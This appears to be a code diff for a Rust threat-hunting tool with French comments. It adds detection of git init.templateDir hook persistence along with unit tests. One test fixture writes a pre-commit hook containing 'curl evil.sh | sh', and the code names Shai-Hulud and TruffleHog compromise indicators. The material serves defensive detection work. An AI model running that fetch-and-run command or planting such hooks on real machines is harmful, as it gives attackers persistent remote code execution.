@@ -70,6 +70,11 @@ pub const SUSPICIOUS_WORKFLOW_FILENAMES: &[&str] = &["shai-hulud-workflow.yml", 
 /// Dossier de cache caché utilisé pour dissimuler un binaire TruffleHog détourné.
 pub const SUSPICIOUS_CACHE_DIRNAME: &str = ".truffler-cache";
 
+/// Répertoire de template git par défaut (SPEC-F08) utilisé quand `init.templateDir`
+/// n'est pas explicitement configuré : vérifié tel quel pour des hooks laissés en
+/// place même si la configuration a depuis été effacée.
+pub const DEFAULT_GIT_TEMPLATE_DIRNAME: &str = ".git-templates";
+
 /// Catégorie d'un signal de compromission détecté sur le disque.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
 pub enum ThreatCategory {
@@ -90,6 +95,10 @@ pub enum ThreatCategory {
     /// commande à chaque session — à vérifier manuellement, pas nécessairement
     /// malveillant en soi (un utilisateur peut légitimement configurer un serveur MCP).
     McpServerInjection,
+    /// `init.templateDir` détourné et/ou hook présent dans le répertoire de template
+    /// git résultant (SPEC-F08) : persistance assurant une réinfection automatique à
+    /// chaque `git init`/`git clone`.
+    GitHookPersistence,
 }
 
 /// Un signal de compromission détecté sur le disque.
@@ -121,6 +130,7 @@ pub fn hunt(workspace_root: &Path, projects: &[Project]) -> Vec<ThreatSignal> {
     ));
     signals.extend(scan_macos_launch_agents());
     signals.extend(scan_claude_user_config());
+    signals.extend(scan_git_hook_persistence());
 
     signals.sort_by(|a, b| a.path.cmp(&b.path));
     signals.dedup();
@@ -395,6 +405,92 @@ pub fn scan_macos_launch_agents() -> Vec<ThreatSignal> {
     }
 }
 
+/// Vérifie `~/.gitconfig` pour une clé `init.templateDir` détournée et le contenu du
+/// répertoire de hooks résultant (SPEC-F08) : tout `git init`/`git clone` copie ce
+/// répertoire dans `.git/hooks/` du nouveau dépôt, assurant une réinfection
+/// automatique à chaque nouveau dépôt créé ou cloné.
+pub fn scan_git_hook_persistence() -> Vec<ThreatSignal> {
+    match dirs::home_dir() {
+        Some(home) => scan_git_hook_persistence_at(&home),
+        None => Vec::new(),
+    }
+}
+
+fn scan_git_hook_persistence_at(home: &Path) -> Vec<ThreatSignal> {
+    let mut signals = Vec::new();
+
+    let gitconfig_path = home.join(".gitconfig");
+    let configured_dir = std::fs::read_to_string(&gitconfig_path)
+        .ok()
+        .and_then(|content| extract_template_dir(&content));
+
+    if let Some(dir) = &configured_dir {
+        signals.push(ThreatSignal {
+            category: ThreatCategory::GitHookPersistence,
+            detail: format!(
+                "init.templateDir détourné vers {dir} : tout `git init`/`git clone` en copie le contenu dans .git/hooks/"
+            ),
+            path: gitconfig_path,
+        });
+    }
+
+    let template_dir = match &configured_dir {
+        Some(dir) => match dir.strip_prefix("~/") {
+            Some(rest) => home.join(rest),
+            None => PathBuf::from(dir),
+        },
+        None => home.join(DEFAULT_GIT_TEMPLATE_DIRNAME),
+    };
+    signals.extend(scan_git_template_hooks_dir(&template_dir));
+
+    signals
+}
+
+/// Extrait la valeur de `templateDir` sous la section `[init]` d'un `.gitconfig`
+/// (analyse texte volontairement simple — pas besoin d'un parseur INI complet pour ce
+/// seul cas, cohérent avec le reste du moteur de Threat Hunting).
+fn extract_template_dir(gitconfig_content: &str) -> Option<String> {
+    let mut in_init_section = false;
+    for line in gitconfig_content.lines() {
+        let trimmed = line.trim();
+        if let Some(section) = trimmed.strip_prefix('[') {
+            in_init_section = section.trim_end_matches(']').eq_ignore_ascii_case("init");
+            continue;
+        }
+        if !in_init_section {
+            continue;
+        }
+        if let Some(value) = trimmed.strip_prefix("templateDir") {
+            let value = value.trim_start().trim_start_matches('=').trim();
+            let value = value.trim_matches('"');
+            if !value.is_empty() {
+                return Some(value.to_string());
+            }
+        }
+    }
+    None
+}
+
+/// Recherche des hooks présents dans `<template_dir>/hooks/` (SPEC-F08) : leur simple
+/// présence est un indice à vérifier manuellement, `init.templateDir` n'ayant
+/// normalement aucun usage légitime courant.
+fn scan_git_template_hooks_dir(template_dir: &Path) -> Vec<ThreatSignal> {
+    let Ok(entries) = std::fs::read_dir(template_dir.join("hooks")) else {
+        return Vec::new();
+    };
+
+    entries
+        .flatten()
+        .filter(|entry| entry.path().is_file())
+        .map(|entry| ThreatSignal {
+            category: ThreatCategory::GitHookPersistence,
+            detail: "hook présent dans un répertoire de template git : vérifier son contenu"
+                .to_string(),
+            path: entry.path(),
+        })
+        .collect()
+}
+
 fn scan_launch_agents_dir(dir: &Path) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
     let Ok(entries) = std::fs::read_dir(dir) else {
@@ -631,6 +727,54 @@ mod tests {
         let signals = scan_launch_agents_dir(dir.path());
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::LaunchAgent);
+    }
+
+    #[test]
+    fn detects_hijacked_init_template_dir_and_flags_gitconfig() {
+        let home = tempfile::tempdir().unwrap();
+        std::fs::write(
+            home.path().join(".gitconfig"),
+            "[user]\n\tname = Test\n[init]\n\ttemplateDir = ~/.git-templates\n",
+        )
+        .unwrap();
+        let hooks_dir = home.path().join(".git-templates").join("hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+        std::fs::write(hooks_dir.join("pre-commit"), "#!/bin/sh\ncurl evil.sh | sh").unwrap();
+
+        let signals = scan_git_hook_persistence_at(home.path());
+
+        assert_eq!(signals.len(), 2);
+        assert!(signals
+            .iter()
+            .all(|s| s.category == ThreatCategory::GitHookPersistence));
+        assert!(signals.iter().any(|s| s.path.ends_with(".gitconfig")));
+        assert!(signals.iter().any(|s| s.path.ends_with("pre-commit")));
+    }
+
+    #[test]
+    fn detects_hooks_left_in_default_git_templates_dir_without_config_override() {
+        let home = tempfile::tempdir().unwrap();
+        let hooks_dir = home.path().join(DEFAULT_GIT_TEMPLATE_DIRNAME).join("hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+        std::fs::write(hooks_dir.join("post-checkout"), "malicious").unwrap();
+
+        let signals = scan_git_hook_persistence_at(home.path());
+
+        assert_eq!(signals.len(), 1);
+        assert_eq!(signals[0].category, ThreatCategory::GitHookPersistence);
+        assert!(signals[0].path.ends_with("post-checkout"));
+    }
+
+    #[test]
+    fn ignores_a_gitconfig_without_hijacked_template_dir() {
+        let home = tempfile::tempdir().unwrap();
+        std::fs::write(
+            home.path().join(".gitconfig"),
+            "[user]\n\tname = Test\n\temail = test@example.com\n",
+        )
+        .unwrap();
+
+        assert!(scan_git_hook_persistence_at(home.path()).is_empty());
     }
 
     #[test]
